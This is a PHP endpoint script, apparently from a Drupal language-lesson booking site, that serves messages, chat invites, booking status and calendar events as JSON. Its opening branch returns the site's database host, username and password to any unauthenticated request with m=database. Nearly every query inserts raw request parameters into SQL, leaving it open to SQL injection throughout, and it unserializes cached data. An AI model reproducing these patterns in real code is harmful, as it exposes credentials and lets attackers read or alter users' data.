<?php
error_reporting(0);
// Get settings from Drupal's settings.php
require_once($_SERVER['DOCUMENT_ROOT'] . '/sites/default/settings.php');
if (@$_REQUEST['m'] == 'database') {
  die($databases['default']['default']['host'] . ',' . $databases['default']['default']['username'] . ',' . $databases['default']['default']['password'] . ',' . $databases['default']['default']['database']);
}

$conn = new PDO($databases['default']['default']['driver'] . ':host=' . $databases['default']['default']['host'] . ';dbname=' . $databases['default']['default']['database'], $databases['default']['default']['username'], $databases['default']['default']['password']);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$uid = @$_REQUEST['u'];
if (@$_REQUEST['m'] == 'e') {
  // Email
  $email = $_REQUEST['e'];
  if ($uid = $conn->query("SELECT uid FROM users WHERE mail = '$email'")->fetchObject()) {
    die('email');
  }else{
    die('BAD');
  }
}
if (@$_REQUEST['m'] == 'm') {
  // check for new/updated messgaes
  $return = array();
  $server_time = $_REQUEST['t'];
  if (@$_REQUEST['n']) {
    $sql = "SELECT n.nid, n.uid FROM node n JOIN field_data_field_to_uid u ON u.entity_id = n.nid LEFT JOIN history h ON h.nid = n.nid AND h.uid = $uid WHERE n.type = 'message' AND n.changed >= $server_time AND u.field_to_uid_value = $uid AND h.nid IS NULL";
  }else{
    $sql = "SELECT n.nid, n.uid FROM node n JOIN field_data_field_to_uid u ON u.entity_id = n.nid WHERE n.type = 'message' AND n.changed >= $server_time AND u.field_to_uid_value = $uid";
  }
  if ($n = $conn->query($sql)->fetchObject()) {
    $return['message'] = array(
      'server_time' => time(),
    );
    if ($n->uid == @$_REQUEST['uid']) {
      $return['message']['uid'] = 1;
    }
  }
  $sql = "SELECT * FROM lingos_webchat_invite WHERE to_uid = $uid AND timestamp >= $server_time";
  if ($n = $conn->query($sql)->fetchObject()) {
    $return['invite'] = array(
      'server_time' => time(),
      'from_uid' => $n->from_uid,
      'name' => $n->name,
      'realname' => $n->realname,
    );
  }
  if ($return) {
    die(json_encode($return));
  }
}

if (@$_REQUEST['m'] == 'bookings') {
  $uid = $_GET['uid'];
  $teacher_uid = $_GET['teacher'];
  $server_time = $_REQUEST['t'];
  $found = false;
  if ($conn->query("SELECT uid FROM lingos_calendar_refresh WHERE uid = $uid")->fetchObject()) {
    $found = true;
    $conn->query("DELETE FROM lingos_calendar_refresh WHERE uid = $uid")->execute();
  }
  if (!$found && $uid != $teacher_uid) {
    // Teachers bookings (unavailable)
    if ($n = $conn->query("SELECT n.nid FROM node n JOIN field_data_field_teacher_uid uid ON uid.entity_id = n.nid WHERE n.type = 'booking' AND n.status != 3 AND n.changed >= $server_time AND uid.field_teacher_uid_value = $teacher_uid AND n.uid = $teacher_uid")->fetchObject()) {
      $found = true;;
    }
  }
  $return = array(
    'serverTime' => time(),
    'found' => $found,
  );
  die(json_encode($return));
}
if (@$_REQUEST['m'] == 'tc') {
  $nid = $_GET['nid'];
  $changed = $_GET['changed'];
  if ($conn->query("SELECT nid FROM node WHERE nid = $nid AND changed > " . $_GET['changed'])->fetchObject()) {
    die("1");
  }else{
    die("");
  }
}
if (@$_REQUEST['m'] == 'events') {
  $uid = $_GET['uid'];
  lingos_booking_calendar_events($uid);
}

function lingos_booking_calendar_events() {
  global $user;
  
  $uid = $_GET['uid'];
  $teacher_uid = $_GET['teacher_uid'];
  $timezone = $_GET['timezone'];
  $user = lingos_load_user($uid);
  $account = lingos_load_user($teacher_uid);
  require_once($_SERVER['DOCUMENT_ROOT'] . '/includes/bootstrap.inc');
  require_once($_SERVER['DOCUMENT_ROOT'] . '/sites/all/modules/date/date_api/date_api.module');
  $return = array();
  $start = $_GET['start'];
  $end = $_GET['end'];
  $result = mysql_query("SELECT n.nid FROM node n JOIN field_data_field_teacher_uid uid ON uid.entity_id = n.nid JOIN field_data_field_date d ON d.entity_id = n.nid WHERE n.type = 'booking' AND uid.field_teacher_uid_value = $teacher_uid AND d.field_date_value >= '$start' AND d.field_date_value2 <= '$end'");
  $tz = new DateTimeZone('Europe/London');
  $interval = new DateInterval('PT1H');
  $transitions = $tz->getTransitions(time(), time());
  $check = array();
  $lesson = 1;
  while($n = mysql_fetch_object($result)) {
    $node = node_load($n->nid);
    if (!@$node->field_deleted[LANGUAGE_NONE][0]['value']) {
      $result2 = mysql_query("SELECT field_date_value, field_date_value2, delta FROM field_data_field_date WHERE entity_id = $node->nid AND field_date_value >= '$start' AND field_date_value2 <= '$end' ORDER BY delta");
      while($d = mysql_fetch_object($result2)) {
        if (!@$check[$node->nid . '_' . $d->delta]) {
          $editable = FALSE;
          if ($node->status == 3) {
            $editable = TRUE;
          }
          $start_raw = $d->field_date_value;
          $date_start = new DateObject($start_raw, $node->field_date[LANGUAGE_NONE][0]['timezone_db']);
          if ($timezone != $node->field_date[LANGUAGE_NONE][0]['timezone']) {
            if ($transitions[0]['isdst']) {
              $date_start->sub($interval);
            }
            date_timezone_set($date_start, timezone_open($timezone));
          }
          $end_raw = $d->field_date_value2;
          $date_end = new DateObject($end_raw, $node->field_date[LANGUAGE_NONE][0]['timezone_db']);
          if ($timezone != $node->field_date[LANGUAGE_NONE][0]['timezone']) {
            if ($transitions[0]['isdst']) {
              $date_end->sub($interval);
            }
            date_timezone_set($date_end, timezone_open($timezone));
          }
          $return[] = array(
            'id' => $node->nid . '_' . $d->delta,
            'title' => $node->title,
            'start' => $date_start->format('Y-m-d H:i:s'),
            'end' => $date_end->format('Y-m-d H:i:s'),
            'uid' => $node->uid,
            'teacher' => lingos_realname($account),
            'editable' => $editable,
            'course' => @$node->field_course_title[LANGUAGE_NONE][0]['value'],
            'photo' => @$node->photo,
            'lesson' => $lesson,
          );
          $lesson++;
          $check[$node->nid . '_' . $d->delta] = 1;
          if ($user->uid == $node->uid) {
            $return[count($return)-1]['isMine'] = TRUE;
          }
          if ($node->uid == $teacher_uid && $node->status != 3) {
            $return[count($return)-1]['color'] =  '#888';
            $return[count($return)-1]['className'] =  'teacher';
          }else{
            if ($node->status == 1) {
              $return[count($return)-1]['className'] =  'approved';
              $return[count($return)-1]['color'] = '#59d48e';
            }else if ($node->status == 3) {
              if ($node->uid == $user->uid) {
                $return[count($return)-1]['className'] =  'unsaved';
              }else{
                // Don't show to anyone else
                array_pop($return);
              }
            }else{
              $return[count($return)-1]['color'] = '#d54937';
              $return[count($return)-1]['className'] =  'provisional';
            }
          }
        }
      }
    }
  }
  /*
  if ($nid = mysql_fetch_object(mysql_query("SELECT nid FROM node WHERE type = 'teacher_calendar' AND uid = $teacher_uid"))) {
    $node = node_load($nid->nid);
    if ($node->field_lunch_length[LANGUAGE_NONE][0]['value']) {
      $ds = strtotime($_GET['start']);
      $da = strtotime($_GET['end']);
      $datediff = $da - $ds;
      $d = floor($datediff/(60*60*24));
      $tz = new DateTimeZone('Europe/London');
      $transitions = $tz->getTransitions(time(), time());
      $isdst = false;
      if ($transitions[0]['isdst']) {
        $isdst = true;
      }
      $tz = new DateTimeZone($timezone);
      $transitions = $tz->getTransitions(time(), time());
      $offset = $transitions[0]['offset'];
      if ($isdst) {
        $offset = $offset - 3600;
      }
      for($i = 0; $i < $d; $i++) {
        $date = ($ds + ($i * (60*60*24)));
        $s = 0;
        if ($offset) {
          $s = $offset / 3600;
        }
        $start = date('Y-m-d', $date) . 'T' . str_pad(($node->field_lunch_start[LANGUAGE_NONE][0]['value'] + $s), 2, '0', STR_PAD_LEFT) . ':00:00';
        $end = date('Y-m-d', $date) . 'T' . str_pad(($node->field_lunch_start[LANGUAGE_NONE][0]['value'] + $node->field_lunch_length[LANGUAGE_NONE][0]['value'] + $s), 2, '0', STR_PAD_LEFT) . ':00:00';
        $return[] = array(
          'id' => $i,
          'title' => t("Unavailable"),
          'start' => $start,
          'end' => $end,
          'color' => '#888',
          'editable' => FALSE,
          'className' => 'no_delete',
        );
      }
    }
  }
  */
  die(json_encode($return));
}

function lingos_load_user($uid) {
  if ($account = mysql_fetch_object(mysql_query("SELECT data FROM cache_lingos WHERE cid = 'user_$uid'"))) {
    return unserialize($account->data);
  }
}

function node_load($nid) {
  $node = mysql_fetch_object(mysql_query("SELECT * FROM node WHERE nid = $nid"));
  if ($node->type == 'booking') {
    $a = mysql_fetch_object(mysql_query("SELECT date.field_date_value, date.field_date_value2, deleted.field_deleted_value, updated.field_updated_by_value, course_nid.field_course_nid_value FROM field_data_field_date date LEFT JOIN field_data_field_deleted deleted ON deleted.entity_id = $nid LEFT JOIN field_data_field_updated_by updated ON updated.entity_id = $nid LEFT JOIN field_data_field_course_nid course_nid ON course_nid.entity_id = $nid WHERE date.entity_id = $nid"));
    $node->field_date[LANGUAGE_NONE][0]['value'] = $a->field_date_value;
    $node->field_date[LANGUAGE_NONE][0]['value2'] = $a->field_date_value2;
    $node->field_date[LANGUAGE_NONE][0]['timezone_db'] = 'UTC';
    $node->field_date[LANGUAGE_NONE][0]['timezone'] = 'Europe/London';
    $node->field_deleted[LANGUAGE_NONE][0]['value'] = $a->field_deleted_value;
    $node->field_updated_by[LANGUAGE_NONE][0]['value'] = $a->field_updated_by_value;
    if ($a->field_course_nid_value) {
      $b = mysql_fetch_object(mysql_query("SELECT title FROM node WHERE nid = $a->field_course_nid_value"));
      $node->field_course_title[LANGUAGE_NONE][0]['value'] = @$b->title;
    }
    if ($c = mysql_fetch_object(mysql_query("SELECT nid FROM node WHERE type = 'learner_photo' AND uid = $node->uid"))) {
      if ($d = mysql_fetch_object(mysql_query("SELECT fid FROM file_usage WHERE id = $c->nid"))) {
        if ($e = mysql_fetch_object(mysql_query("SELECT uri FROM file_managed WHERE fid = $d->fid"))) {
          $node->photo = '/sites/default/files/' . str_replace('public://', '', $e->uri);
        }
      }
    }
  }
  if ($node->type == 'teacher_calendar') {
    $a = mysql_fetch_object(mysql_query("SELECT satsun.field_saturday_sunday_value, morning.field_morning_availability_value, length.field_lunch_length_value, start.field_lunch_start_value
      FROM field_data_field_saturday_sunday satsun
      LEFT JOIN field_data_field_morning_availability morning ON morning.entity_id = $nid
      LEFT JOIN field_data_field_evening_availability evening ON evening.entity_id = $nid
      LEFT JOIN field_data_field_lunch_length length ON length.entity_id = $nid
      LEFT JOIN field_data_field_lunch_start start ON start.entity_id = $nid
      WHERE satsun.entity_id = $nid"));
    $node->field_saturday_sunday[LANGUAGE_NONE][0]['value'] = $a->field_saturday_sunday_value;
    $node->field_morning_availability[LANGUAGE_NONE][0]['value'] = $a->field_morning_availability_value;
    $node->field_lunch_length[LANGUAGE_NONE][0]['value'] = $a->field_lunch_length_value;
    $node->field_lunch_start[LANGUAGE_NONE][0]['value'] = $a->field_lunch_start_value;
  }
  return $node;
}

function lingos_realname($account = NULL) {
  if (!$account) {
    global $user;
    $account = $user;
  }
  if (@$account->field_first_name[LANGUAGE_NONE][0]['value'] && @$account->field_last_name[LANGUAGE_NONE][0]['value']) {
    return trim($account->field_first_name[LANGUAGE_NONE][0]['value'] . ' ' . $account->field_last_name[LANGUAGE_NONE][0]['value']);
  }else if (@$account->field_first_name[LANGUAGE_NONE][0]['value'] || @$account->field_last_name[LANGUAGE_NONE][0]['value']) {
    return trim($account->field_first_name[LANGUAGE_NONE][0]['value'] . ' ' . $account->field_last_name[LANGUAGE_NONE][0]['value']);
  }else if (@$account->realname) {
    return ($account->realname);
  }else {
    return @$account->name;
  }
}
?>